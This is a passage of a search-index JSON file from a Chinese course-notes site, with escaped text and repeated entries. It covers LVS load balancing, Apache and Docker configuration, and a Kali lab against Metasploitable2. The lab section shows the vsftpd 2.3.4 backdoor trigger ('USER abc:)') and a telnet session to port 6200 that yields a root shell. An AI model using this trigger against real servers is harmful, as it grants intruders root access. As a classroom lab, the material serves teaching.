\u6dfb\u52a0\u8def\u7531\uff0c\u56e0\u4e3a\u672c\u5c31\u662f\u76f8\u540c\u7684\u7f51\u6bb5\u6240\u4ee5\u53ef\u4ee5\u4e0d\u6dfb\u52a0\u8be5\u8def\u7531 route add -host 192.168.0.10 dev lo:0 # \u91cd\u65b0\u52a0\u8f7d\u7f51\u5361 service networking restart Load Balancer\u9700\u8981\u8fdb\u884c\u7684\u64cd\u4f5c\uff1a 1\u3001\u5b89\u88c5 ipvsadm 2\u3001\u521b\u5efaeth0\u7684\u522b\u540d\u5e76\u7ed1\u5b9a\u5bf9\u5916IP\uff0c\u4f5c\u4e3a\u96c6\u7fa4\u540c\u65f6\u4f7f\u7528\uff1a ifconfig eth0:0 192.168.0.10 netmask 255.255.255.0 up 3\u3001\u914d\u7f6eipvs\u89c4\u5219\uff1a # \u6dfb\u52a0\u4e00\u4e2a\u65b0\u7684\u96c6\u7fa4\u670d\u52a1 sudo ipvsadm -A -t <Load Balancer\u7684\u5bf9\u5916IP>:<\u7aef\u53e3\u53f7> -s <\u8c03\u5ea6\u7b97\u6cd5> # \u6dfb\u52a0\u4e00\u4e2a\u96c6\u7fa4\u89c4\u5219 sudo ipvsadm -a -t <Load Balancer\u7684\u5bf9\u5916IP>:<\u7aef\u53e3\u53f7> -r <\u540e\u7aef\u670d\u52a1\u5668\u5185\u7f51IP> -g -g \u5b9a\u4e49\u4e3aDR\u6a21\u5f0f","title":"LVS/DR"},{"location":"week08/LVS\u7b80\u4ecb/","text":"LVS\u7b80\u4ecb \u8d1f\u8f7d\u5747\u8861\u7684\u4f18\u52bf\uff1a\u53ef\u4f38\u7f29\u6027\u3001\u9ad8\u53ef\u7528\u6027\u3001\u53ef\u7ba1\u7406\u6027\u3001\u4ef7\u683c\u6709\u6548\u6027\u3002 \u8d1f\u8f7d\u5747\u8861\u7684\u65b9\u5f0f\uff1a\u786c\u4ef6\u8d1f\u8f7d\u5747\u8861\uff0c\u8f6f\u4ef6\u8d1f\u8f7d\u5747\u8861 LVS\u7684\u7ec4\u6210\u90e8\u5206\uff1a\u6700\u524d\u7aef\u7684\u8d1f\u8f7d\u5747\u8861\u5c42\uff0c\u4e2d\u95f4\u7684\u670d\u52a1\u5668\u6c60\u5c42\uff0c\u6700\u540e\u7aef\u7684\u6570\u636e\u5171\u4eab\u50a8\u5b58\u5c42 \u8c03\u5ea6\u7b97\u6cd5\uff1a\u8f6e\u8be2\uff0c\u52a0\u6743\u8f6e\u8be2\uff0c\u6700\u5c11\u8fde\u63a5\uff0c\u52a0\u6743\u6700\u5c11\u8fde\u63a5\uff0c\u57fa\u4e8e\u5c40\u90e8\u6027\u7684\u6700\u5c11\u8fde\u63a5\uff0c\u5e26\u590d\u5236\u7684\u57fa\u4e8e\u5c40\u90e8\u6027\u6700\u5c11\u8fde\u63a5\uff0c\u76ee\u6807\u5730\u5740\u6563\u5217\uff0c\u6e90\u5730\u5740\u6563\u5217 LVS\u662f\u57fa\u4e8eIP\u8d1f\u8f7d\u5747\u8861\u7684\u8ba1\u6570\uff0c\u901a\u8fc7IPVS\u6a21\u5757\u5b9e\u73b0\uff0c\u4f4d\u4e8e\u8d1f\u8f7d\u8c03\u5ea6\u5668\u4e0a\u3002 \u8d1f\u8f7d\u5747\u8861\u6280\u672f\u5206\u7c7b\uff1a \u901a\u8fc7 NAT \u5b9e\u73b0\u865a\u62df\u670d\u52a1\u5668\uff08 VS/NAT \uff09 \u901a\u8fc7\u76f4\u63a5\u8def\u7531\u5b9e\u73b0\u865a\u62df\u670d\u52a1\u5668\uff08 VS/DR \uff09 \u901a\u8fc7IP\u96a7\u9053\u5b9e\u73b0\u865a\u62df\u670d\u52a1\u5668\uff08 VS/TUN \uff09 VS/NAT \uff1a\u5185\u7f51\u96c6\u7fa4\uff0c\u652f\u6301\u7aef\u53e3\u6620\u5c04\uff1b\u6240\u6709\u8fdb\u51fa\u62a5\u6587\u90fd\u7ecf\u8fc7\u8d1f\u8f7d\u5747\u8861\u5668\uff0c\u8c03\u5ea6\u5668\u6613\u6210\u4e3a\u6027\u80fd\u74f6\u9888 VS/DR \uff1a\u5185\u7f51\u96c6\u7fa4\uff0c\u4e0d\u652f\u6301\u7aef\u53e3\u6620\u5c04\uff0c\u54cd\u5e94\u62a5\u6587\u76f4\u63a5\u8fd4\u56de\u7ed9\u5ba2\u6237\u7aef\uff0c\u8d1f\u8f7d\u5747\u8861\u5668\u4ec5\u8d1f\u8d23\u5904\u7406\u5165\u7ad9\u8bf7\u6c42 VS/TUN \uff1a\u516c\u7f51\u96c6\u7fa4\uff0c\u4e0d\u652f\u6301\u7aef\u53e3\u6620\u5c04\uff0c\u54cd\u5e94\u62a5\u6587\u76f4\u63a5\u8fd4\u56de\u7ed9\u5ba2\u6237\u7aef\uff0c\u8d1f\u8f7d\u5747\u8861\u5668\u4ec5\u8d1f\u8d23\u5904\u7406\u5165\u7ad9\u8bf7\u6c42","title":"LVS \u7b80\u4ecb"},{"location":"week08/LVS\u7b80\u4ecb/#lvs","text":"\u8d1f\u8f7d\u5747\u8861\u7684\u4f18\u52bf\uff1a\u53ef\u4f38\u7f29\u6027\u3001\u9ad8\u53ef\u7528\u6027\u3001\u53ef\u7ba1\u7406\u6027\u3001\u4ef7\u683c\u6709\u6548\u6027\u3002 \u8d1f\u8f7d\u5747\u8861\u7684\u65b9\u5f0f\uff1a\u786c\u4ef6\u8d1f\u8f7d\u5747\u8861\uff0c\u8f6f\u4ef6\u8d1f\u8f7d\u5747\u8861 LVS\u7684\u7ec4\u6210\u90e8\u5206\uff1a\u6700\u524d\u7aef\u7684\u8d1f\u8f7d\u5747\u8861\u5c42\uff0c\u4e2d\u95f4\u7684\u670d\u52a1\u5668\u6c60\u5c42\uff0c\u6700\u540e\u7aef\u7684\u6570\u636e\u5171\u4eab\u50a8\u5b58\u5c42 \u8c03\u5ea6\u7b97\u6cd5\uff1a\u8f6e\u8be2\uff0c\u52a0\u6743\u8f6e\u8be2\uff0c\u6700\u5c11\u8fde\u63a5\uff0c\u52a0\u6743\u6700\u5c11\u8fde\u63a5\uff0c\u57fa\u4e8e\u5c40\u90e8\u6027\u7684\u6700\u5c11\u8fde\u63a5\uff0c\u5e26\u590d\u5236\u7684\u57fa\u4e8e\u5c40\u90e8\u6027\u6700\u5c11\u8fde\u63a5\uff0c\u76ee\u6807\u5730\u5740\u6563\u5217\uff0c\u6e90\u5730\u5740\u6563\u5217 LVS\u662f\u57fa\u4e8eIP\u8d1f\u8f7d\u5747\u8861\u7684\u8ba1\u6570\uff0c\u901a\u8fc7IPVS\u6a21\u5757\u5b9e\u73b0\uff0c\u4f4d\u4e8e\u8d1f\u8f7d\u8c03\u5ea6\u5668\u4e0a\u3002 \u8d1f\u8f7d\u5747\u8861\u6280\u672f\u5206\u7c7b\uff1a \u901a\u8fc7 NAT \u5b9e\u73b0\u865a\u62df\u670d\u52a1\u5668\uff08 VS/NAT \uff09 \u901a\u8fc7\u76f4\u63a5\u8def\u7531\u5b9e\u73b0\u865a\u62df\u670d\u52a1\u5668\uff08 VS/DR \uff09 \u901a\u8fc7IP\u96a7\u9053\u5b9e\u73b0\u865a\u62df\u670d\u52a1\u5668\uff08 VS/TUN \uff09 VS/NAT \uff1a\u5185\u7f51\u96c6\u7fa4\uff0c\u652f\u6301\u7aef\u53e3\u6620\u5c04\uff1b\u6240\u6709\u8fdb\u51fa\u62a5\u6587\u90fd\u7ecf\u8fc7\u8d1f\u8f7d\u5747\u8861\u5668\uff0c\u8c03\u5ea6\u5668\u6613\u6210\u4e3a\u6027\u80fd\u74f6\u9888 VS/DR \uff1a\u5185\u7f51\u96c6\u7fa4\uff0c\u4e0d\u652f\u6301\u7aef\u53e3\u6620\u5c04\uff0c\u54cd\u5e94\u62a5\u6587\u76f4\u63a5\u8fd4\u56de\u7ed9\u5ba2\u6237\u7aef\uff0c\u8d1f\u8f7d\u5747\u8861\u5668\u4ec5\u8d1f\u8d23\u5904\u7406\u5165\u7ad9\u8bf7\u6c42 VS/TUN \uff1a\u516c\u7f51\u96c6\u7fa4\uff0c\u4e0d\u652f\u6301\u7aef\u53e3\u6620\u5c04\uff0c\u54cd\u5e94\u62a5\u6587\u76f4\u63a5\u8fd4\u56de\u7ed9\u5ba2\u6237\u7aef\uff0c\u8d1f\u8f7d\u5747\u8861\u5668\u4ec5\u8d1f\u8d23\u5904\u7406\u5165\u7ad9\u8bf7\u6c42","title":"LVS\u7b80\u4ecb"},{"location":"week09/Apache\u914d\u7f6e\u5165\u95e8/","text":"Apache\u914d\u7f6e\u5165\u95e8 \u5b89\u88c5\uff08\u5728Ret Hat\u7cfb\u4e3ahttpd\uff09\uff1a $ sudo apt install apache2 \u914d\u7f6e\u6587\u4ef6\u4f4d\u4e8e /etc/apache2/ \uff0c\u7ed3\u6784\uff1a apache2.conf \u4e3b\u914d\u7f6e\u6587\u4ef6 ports.conf \u76d1\u542c\u7aef\u53e3\u914d\u7f6e envvars \u73af\u5883\u53d8\u91cf\u914d\u7f6e magic \u5224\u65ad\u6587\u4ef6MIME\u7c7b\u578b\u7684\u914d\u7f6e\u6587\u4ef6 conf \u6307\u4ee4\u914d\u7f6e mods \u6a21\u5757\u914d\u7f6e site \u7ad9\u70b9\u914d\u7f6e \u4fee\u6539\u914d\u7f6e\u540e\u8981reload: $ sudo service apache2 reload \u3010\u4e3b\u914d\u7f6e\u6587\u4ef6\u3011 <Directory>\uff1a\u914d\u7f6e\u67d0\u76ee\u5f55\u7684\u8bbf\u95ee Indexes: \u82e5\u6ca1\u6709index.html\u5219\u5c55\u793a\u6587\u4ef6\u5217\u8868 FollowSymLinks: \u5141\u8bb8\u8bfb\u53d6\u76ee\u5f55\u4e2d\u7684\u7b26\u53f7\u94fe\u63a5 AllowOverride: \u5728\u4f7f\u7528rewrite\u6a21\u5757\u91cd\u5199\u65f6\u80fd\u5426\u8bfb\u53d6 .htaccess \u4e2d\u7684\u91cd\u5199\u89c4\u5219 Require: \u8bbf\u95ee\u63a7\u5236 Require all granted \u5141\u8bb8\u6240\u6709\u6765\u6e90\u8bbf\u95ee Require all denied \u62d2\u7edd\u6240\u6709\u6765\u6e90\u8bbf\u95ee Require ip x.x.x.x \u5141\u8bb8IP\u4e3ax.x.x.x\u7684\u6765\u6e90\u8bbf\u95ee \u4f7f\u7528\u6b63\u5219\u8868\u8fbe\u5f0f\u5339\u914d\u76ee\u5f55\uff1a <Directory \\~ \"REGEXP\"> <DirectoryMatch \"REGEXP\"> \u3010\u7aef\u53e3\u914d\u7f6e\u3011 Listen \u76d1\u542c\u7684\u7aef\u53e3 \u3010\u7ad9\u70b9\u914d\u7f6e\u3011 \u6240\u6709\u7ad9\u70b9\u4fe1\u606f\u90fd\u662f\u901a\u8fc7<VirtualHost>\u6765\u5305\u542b\uff0c\u914d\u7f6e\u591a\u4e2a<VirtualHost>\u5373\u53ef\u521b\u5efa\u591a\u4e2a\u865a\u62df\u4e3b\u673a\uff0c\u8bbf\u95ee\u591a\u4e2a\u865a\u62df\u4e3b\u673a\u53ef\u4ee5\u901a\u8fc7\u8fd9\u6837\u7684\u65b9\u5f0f\u6765\u533a\u5206\uff1a IP\u5730\u5740 \u76d1\u542c\u7684\u7aef\u53e3\u53f7 \u8bbf\u95ee\u7684Servername \u5728sites-available\u4e2d\u521b\u5efa\u65b0\u7684\u914d\u7f6e\u6587\u4ef6\uff08\u4e00\u822c\u4ee5.conf\u7ed3\u5c3e\uff09\u540e\uff0c\u8fd0\u884c\uff1a $ sudo a2ensite xxx.conf \u6765\u8ba9Apache\u521b\u5efa\u4e00\u4e2a\u8f6f\u94fe\u63a5\u5230sites-enable\u4e2d\uff0c\u8fd9\u6837Apache\u624d\u4f1a\u8bfb\u53d6\u76f8\u5173\u7684\u914d\u7f6e\u6587\u4ef6\u3002 \u3010\u6a21\u5757\u914d\u7f6e\u3011 \u7c7b\u4f3c\u7684\uff0c\u4f7f\u7528 a2enmod \u547d\u4ee4\u6765\u542f\u7528\u6a21\u5757\u3002 Apache\u5b89\u5168\u914d\u7f6e\uff1a envvars\u7684 APACHE_RUN_* \u914d\u7f6e\u4e86Apache\u8fd0\u884c\u7684\u7528\u6237\u3001\u7528\u6237\u7ec4\u3001\u4e3b\u76ee\u5f55\uff0c\u9ed8\u8ba4\u4ee5 www-data \u7528\u6237\u8fd0\u884c\u3002 \u5728 conf-available/security.conf \u8bbe\u7f6e ServerSignature \u4e3aOff\uff0c\u5728\u9519\u8bef\u9875\u9762\u9690\u85cfApache\u548c\u7cfb\u7edf\u7684\u7248\u672c\u4fe1\u606f\u3002 Apache\u81ea\u5e26\u7684\u7528\u6237\u8ba4\u8bc1\uff1a \u5b89\u88c5 apache2-utils \uff0c\u4f7f\u7528 htpasswd \u521b\u5efa\u5bc6\u7801\u6587\u4ef6\uff0c\u5728 apache2.conf \u7684<Directory>\u914d\u7f6eAuthType\u3001AuthUserFile\u7b49\u4fe1\u606f\uff1a <Directory /var/www/> Options Indexes FollowSymLinks AllowOverride None AuthType basic AuthName \"need auth\" AuthUserFile /var/www/.htpasswd Require valid-user </Directory>","title":"Apache \u914d\u7f6e\u5165\u95e8"},{"location":"week09/Apache\u914d\u7f6e\u5165\u95e8/#apache","text":"\u5b89\u88c5\uff08\u5728Ret Hat\u7cfb\u4e3ahttpd\uff09\uff1a $ sudo apt install apache2 \u914d\u7f6e\u6587\u4ef6\u4f4d\u4e8e /etc/apache2/ \uff0c\u7ed3\u6784\uff1a apache2.conf \u4e3b\u914d\u7f6e\u6587\u4ef6 ports.conf \u76d1\u542c\u7aef\u53e3\u914d\u7f6e envvars \u73af\u5883\u53d8\u91cf\u914d\u7f6e magic \u5224\u65ad\u6587\u4ef6MIME\u7c7b\u578b\u7684\u914d\u7f6e\u6587\u4ef6 conf \u6307\u4ee4\u914d\u7f6e mods \u6a21\u5757\u914d\u7f6e site \u7ad9\u70b9\u914d\u7f6e \u4fee\u6539\u914d\u7f6e\u540e\u8981reload: $ sudo service apache2 reload \u3010\u4e3b\u914d\u7f6e\u6587\u4ef6\u3011 <Directory>\uff1a\u914d\u7f6e\u67d0\u76ee\u5f55\u7684\u8bbf\u95ee Indexes: \u82e5\u6ca1\u6709index.html\u5219\u5c55\u793a\u6587\u4ef6\u5217\u8868 FollowSymLinks: \u5141\u8bb8\u8bfb\u53d6\u76ee\u5f55\u4e2d\u7684\u7b26\u53f7\u94fe\u63a5 AllowOverride: \u5728\u4f7f\u7528rewrite\u6a21\u5757\u91cd\u5199\u65f6\u80fd\u5426\u8bfb\u53d6 .htaccess \u4e2d\u7684\u91cd\u5199\u89c4\u5219 Require: \u8bbf\u95ee\u63a7\u5236 Require all granted \u5141\u8bb8\u6240\u6709\u6765\u6e90\u8bbf\u95ee Require all denied \u62d2\u7edd\u6240\u6709\u6765\u6e90\u8bbf\u95ee Require ip x.x.x.x \u5141\u8bb8IP\u4e3ax.x.x.x\u7684\u6765\u6e90\u8bbf\u95ee \u4f7f\u7528\u6b63\u5219\u8868\u8fbe\u5f0f\u5339\u914d\u76ee\u5f55\uff1a <Directory \\~ \"REGEXP\"> <DirectoryMatch \"REGEXP\"> \u3010\u7aef\u53e3\u914d\u7f6e\u3011 Listen \u76d1\u542c\u7684\u7aef\u53e3 \u3010\u7ad9\u70b9\u914d\u7f6e\u3011 \u6240\u6709\u7ad9\u70b9\u4fe1\u606f\u90fd\u662f\u901a\u8fc7<VirtualHost>\u6765\u5305\u542b\uff0c\u914d\u7f6e\u591a\u4e2a<VirtualHost>\u5373\u53ef\u521b\u5efa\u591a\u4e2a\u865a\u62df\u4e3b\u673a\uff0c\u8bbf\u95ee\u591a\u4e2a\u865a\u62df\u4e3b\u673a\u53ef\u4ee5\u901a\u8fc7\u8fd9\u6837\u7684\u65b9\u5f0f\u6765\u533a\u5206\uff1a IP\u5730\u5740 \u76d1\u542c\u7684\u7aef\u53e3\u53f7 \u8bbf\u95ee\u7684Servername \u5728sites-available\u4e2d\u521b\u5efa\u65b0\u7684\u914d\u7f6e\u6587\u4ef6\uff08\u4e00\u822c\u4ee5.conf\u7ed3\u5c3e\uff09\u540e\uff0c\u8fd0\u884c\uff1a $ sudo a2ensite xxx.conf \u6765\u8ba9Apache\u521b\u5efa\u4e00\u4e2a\u8f6f\u94fe\u63a5\u5230sites-enable\u4e2d\uff0c\u8fd9\u6837Apache\u624d\u4f1a\u8bfb\u53d6\u76f8\u5173\u7684\u914d\u7f6e\u6587\u4ef6\u3002 \u3010\u6a21\u5757\u914d\u7f6e\u3011 \u7c7b\u4f3c\u7684\uff0c\u4f7f\u7528 a2enmod \u547d\u4ee4\u6765\u542f\u7528\u6a21\u5757\u3002 Apache\u5b89\u5168\u914d\u7f6e\uff1a envvars\u7684 APACHE_RUN_* \u914d\u7f6e\u4e86Apache\u8fd0\u884c\u7684\u7528\u6237\u3001\u7528\u6237\u7ec4\u3001\u4e3b\u76ee\u5f55\uff0c\u9ed8\u8ba4\u4ee5 www-data \u7528\u6237\u8fd0\u884c\u3002 \u5728 conf-available/security.conf \u8bbe\u7f6e ServerSignature \u4e3aOff\uff0c\u5728\u9519\u8bef\u9875\u9762\u9690\u85cfApache\u548c\u7cfb\u7edf\u7684\u7248\u672c\u4fe1\u606f\u3002 Apache\u81ea\u5e26\u7684\u7528\u6237\u8ba4\u8bc1\uff1a \u5b89\u88c5 apache2-utils \uff0c\u4f7f\u7528 htpasswd \u521b\u5efa\u5bc6\u7801\u6587\u4ef6\uff0c\u5728 apache2.conf \u7684<Directory>\u914d\u7f6eAuthType\u3001AuthUserFile\u7b49\u4fe1\u606f\uff1a <Directory /var/www/> Options Indexes FollowSymLinks AllowOverride None AuthType basic AuthName \"need auth\" AuthUserFile /var/www/.htpasswd Require valid-user </Directory>","title":"Apache\u914d\u7f6e\u5165\u95e8"},{"location":"week11/Docker\u5bb9\u5668\u4e0e\u955c\u50cf\u7ba1\u7406/","text":"Docker\u5bb9\u5668\u4e0e\u955c\u50cf\u7ba1\u7406 \u67e5\u770bdocker\u5e2e\u52a9\uff1a docker --help docker\u7684\u547d\u4ee4\u5206\u4e3aManagement Commands\u548cCommands\u3002Commands\u662f\u4e00\u4e9b\u9876\u7ea7\u547d\u4ee4\uff0cManagement Commands\u5c06\u547d\u4ee4\u8fdb\u884c\u4e86\u5206\u7ec4\uff0c\u66f4\u5177\u6709\u53ef\u8bfb\u6027\u3002 \u67e5\u770b\u5bb9\u5668\u5217\u8868\uff1a docker container ls \u6216 docker ps -a \u663e\u793a\u6240\u6709\u5bb9\u5668 -q \u4ec5\u663e\u793aID -s \u663e\u793a\u603b\u7684\u6587\u4ef6\u5927\u5c0f \u521b\u5efa\u5e76\u8fd0\u884c\u5bb9\u5668\uff1a docker container run \u955c\u50cf\u540d \u6216 docker run \u955c\u50cf\u540d \uff0c\u76f8\u5f53\u4e8e\u5148 create \u5bb9\u5668\uff0c\u7136\u540e start \u5bb9\u5668\u3002 -i \u4ea4\u4e92\u6a21\u5f0f -t \u5206\u914d\u7ec8\u7aef --rm \u9000\u51fa\u5bb9\u5668\u65f6\u81ea\u52a8\u5220\u9664 -p \u4e3b\u673a\u7aef\u53e3:\u5bb9\u5668\u7aef\u53e3 \u5c06\u5bb9\u5668\u7684\u7aef\u53e3\u6620\u5c04\u5230\u4e3b\u673a -v \u6307\u5b9a\u6570\u636e\u5377 --env-file \u914d\u7f6e\u6587\u4ef6\u8def\u5f84 \u4f7f\u7528\u6307\u5b9a\u7684\u914d\u7f6e\u6587\u4ef6\u8fd0\u884c \u9000\u51fa\u5bb9\u5668\uff1a exit \u547d\u4ee4\u6216 Ctrl+q \uff1a\u7a0b\u5e8f\u7ec8\u6b62\uff0c\u5bb9\u5668\u505c\u6b62 Ctrl+p Ctrl+q \u9000\u51fa\u5bb9\u5668\uff0c\u5bb9\u5668\u4ecd\u7136\u4fdd\u6301\u8fd0\u884c \u67e5\u770b\u5bb9\u5668\u7684\u8be6\u7ec6\u4fe1\u606f\uff1a docker container inspect \u5bb9\u5668 \u6216 docker inspect \u5bb9\u5668 \uff0c\u53ef\u4ee5\u901a\u8fc7\u5bb9\u5668\u540d\u3001\u5bb9\u5668ID\u6216\u5bb9\u5668\u77edID\u6765\u6307\u5b9a\u5bb9\u5668 \u8fde\u63a5\u5230\u5bb9\u5668\uff1a docker container attach \u5bb9\u5668 \u6216 docker attach \u5bb9\u5668 docker container \u8fd8\u6709\u5176\u5b83\u4e00\u4e9b\u547d\u4ee4\uff1a log \u83b7\u53d6\u65e5\u5fd7\u3002 -t \u663e\u793a\u65f6\u95f4\u6233\uff0c -f \u5b9e\u65f6\u8f93\u51fa top \u663e\u793a\u8fdb\u7a0b diff \u67e5\u770b\u4fee\u6539 restart \u91cd\u542f exec \u547d\u4ee4 \u6267\u884c\u547d\u4ee4 rm \u5220\u9664\u5bb9\u5668 docker image \u7cfb\u5217\u547d\u4ee4\uff1a ls \u67e5\u770b\u955c\u50cf\u5217\u8868 inspect \u67e5\u770b\u955c\u50cf\u8be6\u7ec6\u4fe1\u606f pull \u955c\u50cf\u540d:\u6807\u7b7e \u62c9\u53d6\u955c\u50cf rm \u5220\u9664\u955c\u50cf \u4f7f\u7528Dockerfile\u6784\u5efa\u955c\u50cf\uff1a \u7f16\u5199Dockerfile \u4f7f\u7528Dockerfile\u6784\u5efa\u955c\u50cf\uff1a docker build -t \u955c\u50cf\u540d:\u6807\u7b7e .","title":"Docker \u5bb9\u5668\u4e0e\u955c\u50cf\u7ba1\u7406"},{"location":"week11/Docker\u5bb9\u5668\u4e0e\u955c\u50cf\u7ba1\u7406/#docker","text":"\u67e5\u770bdocker\u5e2e\u52a9\uff1a docker --help docker\u7684\u547d\u4ee4\u5206\u4e3aManagement Commands\u548cCommands\u3002Commands\u662f\u4e00\u4e9b\u9876\u7ea7\u547d\u4ee4\uff0cManagement Commands\u5c06\u547d\u4ee4\u8fdb\u884c\u4e86\u5206\u7ec4\uff0c\u66f4\u5177\u6709\u53ef\u8bfb\u6027\u3002 \u67e5\u770b\u5bb9\u5668\u5217\u8868\uff1a docker container ls \u6216 docker ps -a \u663e\u793a\u6240\u6709\u5bb9\u5668 -q \u4ec5\u663e\u793aID -s \u663e\u793a\u603b\u7684\u6587\u4ef6\u5927\u5c0f \u521b\u5efa\u5e76\u8fd0\u884c\u5bb9\u5668\uff1a docker container run \u955c\u50cf\u540d \u6216 docker run \u955c\u50cf\u540d \uff0c\u76f8\u5f53\u4e8e\u5148 create \u5bb9\u5668\uff0c\u7136\u540e start \u5bb9\u5668\u3002 -i \u4ea4\u4e92\u6a21\u5f0f -t \u5206\u914d\u7ec8\u7aef --rm \u9000\u51fa\u5bb9\u5668\u65f6\u81ea\u52a8\u5220\u9664 -p \u4e3b\u673a\u7aef\u53e3:\u5bb9\u5668\u7aef\u53e3 \u5c06\u5bb9\u5668\u7684\u7aef\u53e3\u6620\u5c04\u5230\u4e3b\u673a -v \u6307\u5b9a\u6570\u636e\u5377 --env-file \u914d\u7f6e\u6587\u4ef6\u8def\u5f84 \u4f7f\u7528\u6307\u5b9a\u7684\u914d\u7f6e\u6587\u4ef6\u8fd0\u884c \u9000\u51fa\u5bb9\u5668\uff1a exit \u547d\u4ee4\u6216 Ctrl+q \uff1a\u7a0b\u5e8f\u7ec8\u6b62\uff0c\u5bb9\u5668\u505c\u6b62 Ctrl+p Ctrl+q \u9000\u51fa\u5bb9\u5668\uff0c\u5bb9\u5668\u4ecd\u7136\u4fdd\u6301\u8fd0\u884c \u67e5\u770b\u5bb9\u5668\u7684\u8be6\u7ec6\u4fe1\u606f\uff1a docker container inspect \u5bb9\u5668 \u6216 docker inspect \u5bb9\u5668 \uff0c\u53ef\u4ee5\u901a\u8fc7\u5bb9\u5668\u540d\u3001\u5bb9\u5668ID\u6216\u5bb9\u5668\u77edID\u6765\u6307\u5b9a\u5bb9\u5668 \u8fde\u63a5\u5230\u5bb9\u5668\uff1a docker container attach \u5bb9\u5668 \u6216 docker attach \u5bb9\u5668 docker container \u8fd8\u6709\u5176\u5b83\u4e00\u4e9b\u547d\u4ee4\uff1a log \u83b7\u53d6\u65e5\u5fd7\u3002 -t \u663e\u793a\u65f6\u95f4\u6233\uff0c -f \u5b9e\u65f6\u8f93\u51fa top \u663e\u793a\u8fdb\u7a0b diff \u67e5\u770b\u4fee\u6539 restart \u91cd\u542f exec \u547d\u4ee4 \u6267\u884c\u547d\u4ee4 rm \u5220\u9664\u5bb9\u5668 docker image \u7cfb\u5217\u547d\u4ee4\uff1a ls \u67e5\u770b\u955c\u50cf\u5217\u8868 inspect \u67e5\u770b\u955c\u50cf\u8be6\u7ec6\u4fe1\u606f pull \u955c\u50cf\u540d:\u6807\u7b7e \u62c9\u53d6\u955c\u50cf rm \u5220\u9664\u955c\u50cf \u4f7f\u7528Dockerfile\u6784\u5efa\u955c\u50cf\uff1a \u7f16\u5199Dockerfile \u4f7f\u7528Dockerfile\u6784\u5efa\u955c\u50cf\uff1a docker build -t \u955c\u50cf\u540d:\u6807\u7b7e .","title":"Docker\u5bb9\u5668\u4e0e\u955c\u50cf\u7ba1\u7406"},{"location":"week14/Kali\u5b9e\u9a8c\u73af\u5883\u4ecb\u7ecd\u4e0e\u4f7f\u7528/","text":"Kali\u5b9e\u9a8c\u73af\u5883\u4ecb\u7ecd\u4e0e\u4f7f\u7528 \u653b\u51fb\u673a\uff1aKali Linux\uff1b\u9776\u673a\uff1aMetasploitable2 \u9776\u673a\u7cfb\u7edf\u5f00\u653e\u4e86\u5f88\u591a\u670d\u52a1\uff0c\u67e5\u770b\u7cfb\u7edf\u76d1\u542c\u7684\u7aef\u53e3\uff1a netstat -tln \uff0c\u67e5\u770b\u5f53\u524d\u7cfb\u7edf\u5f00\u653e\u7684\u670d\u52a1\uff1a rpcinfo -p localhost \u7aef\u53e3\u626b\u63cf\u5de5\u5177 nmap \uff1a \u626b\u63cftarget\u4e3b\u673a\u76841-1000\u7aef\u53e3\uff1a nmap -p 1-1000 target \u901a\u8fc7\u53d1\u7b11\u8138\u7b26\u53f7\u7ed9FTP\u670d\u52a1\u83b7\u5f97Shell\u6743\u9650 \u5229\u7528vsftpd\u6f0f\u6d1e\uff1a root@kali:~# telnet target 21 Trying 192.168.122.102... Connected to target. Escape character is '^]'. 220 (vsFTPd 2.3.4) USER abc:) 331 Please specify the password. PASS pass \u626b\u63cf\u53d1\u73b06200\u7aef\u53e3\u5df2\u6253\u5f00\uff1a root@kali:~# nmap -p 6200 target ... Host is up (0.0019s latency). PORT STATE SERVICE 6200/tcp open unknown MAC Address: 52:54:00:1A:11:0B (QEMU virtual NIC) Nmap done: 1 IP address (1 host up) scanned in 1.35 seconds \u83b7\u53d6root\u6743\u9650\uff1a root@kali:~# telnet target 6200 Trying 192.168.122.102... Connected to target. Escape character is '^]'. id; uid=0(root) gid=0(root)","title":"Kali \u5b9e\u9a8c\u73af\u5883\u4ecb\u7ecd\u4e0e\u4f7f\u7528"},{"location":"week14/Kali\u5b9e\u9a8c\u73af\u5883\u4ecb\u7ecd\u4e0e\u4f7f\u7528/#kali","text":"\u653b\u51fb\u673a\uff1aKali Linux\uff1b\u9776\u673a\uff1aMetasploitable2 \u9776\u673a\u7cfb\u7edf\u5f00\u653e\u4e86\u5f88\u591a\u670d\u52a1\uff0c\u67e5\u770b\u7cfb\u7edf\u76d1\u542c\u7684\u7aef\u53e3\uff1a netstat -tln \uff0c\u67e5\u770b\u5f53\u524d\u7cfb\u7edf\u5f00\u653e\u7684\u670d\u52a1\uff1a rpcinfo -p localhost \u7aef\u53e3\u626b\u63cf\u5de5\u5177 nmap \uff1a \u626b\u63cftarget\u4e3b\u673a\u76841-1000\u7aef\u53e3\uff1a nmap -p 1-1000 target","title":"Kali\u5b9e\u9a8c\u73af\u5883\u4ecb\u7ecd\u4e0e\u4f7f\u7528"},{"location":"week14/Kali\u5b9e\u9a8c\u73af\u5883\u4ecb\u7ecd\u4e0e\u4f7f\u7528/#ftpshell","text":"\u5229\u7528vsftpd\u6f0f\u6d1e\uff1a root@kali:~# telnet target 21 Trying 192.168.122.102... Connected to target. Escape character is '^]'. 220 (vsFTPd 2.3.4) USER abc:) 331 Please specify the password. PASS pass \u626b\u63cf\u53d1\u73b06200\u7aef\u53e3\u5df2\u6253\u5f00\uff1a root@kali:~# nmap -p 6200 target ... Host is up (0.0019s latency). PORT STATE SERVICE 6200/tcp open unknown MAC Address: 52:54:00:1A:11:0B (QEMU virtual NIC) Nmap done: 1 IP address (1 host up) scanned in 1.35 seconds \u83b7\u53d6root\u6743\u9650\uff1a root@kali:~# telnet target 6200 Trying 192.168.122.102... Connected to target. Escape character is '^]'. id; uid=0(root) gid=0(root)","title":"\u901a\u8fc7\u53d1\u7b11\u8138\u7b26\u53f7\u7ed9FTP\u670d\u52a1\u83b7\u5f97Shell\u6743\u9650"}]}